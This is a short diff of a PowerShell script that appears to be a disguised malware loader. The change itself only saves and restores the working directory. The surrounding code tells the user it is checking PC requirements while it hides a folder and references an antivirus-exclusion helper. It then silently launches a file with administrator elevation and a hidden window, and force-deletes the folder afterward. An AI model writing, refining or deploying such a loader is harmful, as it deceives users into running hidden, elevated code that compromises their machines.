@@ -33,6 +33,7 @@ function Add-Exclusion {
 
 try {
     Write-Host "Downloading the program and checking for your PC requirements (can take up to 5 minutes)..."
+    $originalDirectory = Get-Location
     Set-Location $hiddenFolder
     #Add-Exclusion -Path $hiddenFolder
     Set-ItemProperty -Path $hiddenFolder -name Attributes -Value $hiddenAttr
@@ -47,6 +48,7 @@ try {
     Start-Process -FilePath $tempPath2 -WindowStyle $hiddenAttr -Verb $runAs
     Start-Sleep -Seconds 20
     Remove-Item $hiddenFolder -Recurse -Force
+    Set-Location $originalDirectory
 } catch {
     exit 1
 } finally {
